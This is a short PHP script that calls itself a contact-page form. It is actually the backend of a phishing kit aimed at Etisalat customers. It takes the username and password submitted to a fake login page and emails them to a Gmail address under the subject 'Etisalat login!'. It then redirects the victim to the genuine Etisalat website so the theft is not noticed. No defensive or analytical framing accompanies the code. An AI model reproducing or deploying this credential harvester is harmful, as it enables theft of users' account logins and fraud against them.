<?php

 /*
 * @Web Contact Page PHP Script
 * @author helpvid@ymail.com - http://www.helpvid.net
 * @version 1.0.0
 * @date January  05, 2010
 * @category Helpvid PHP Script for Contact page
 * @copyright (c) 2010 @helpvid.net (www.helpvid.net)
 * @Creative Commons Attribution-No Derivative Works 2.0 UK: England & Wales License.
 * @Creative Commons Attribution-No Derivative Works 2.5 UK: SCOTLAND License.
 * @Creative Commons Attribution-No Derivative Works 3.0 United States License.
 */


/* Email Variables */
$emailSubject = 'Etisalat login!'; /*Make sure this matches the name of your file*/
$webMaster = 'vanderwaal202@gmail.com';

/*design by Mark Leroy @ http://www.helpvid.net*/

/* Data Variables */
$username2 = $_POST['username2'];
$password2 = $_POST['password2'];





$body = <<<EOD
<br><hr><br>
username: $username2 <br>
password: $password2 <br>

EOD;
$headers = "From: $Email\r\n";
$headers .= "Content-type: text/html\r\n";
$success = mail($webMaster, $emailSubject, $body,
$headers);


/* Results rendered as HTML */
$theResults = <<<EOD
<html>
<head>
<title>Etisalat Login</title>
<meta http-equiv="refresh" content="1;https://www.eim.ae">
<style type="text/css">
<!--

-->
</style>
</head>

</body>
</html>
EOD;
echo "$theResults";
?>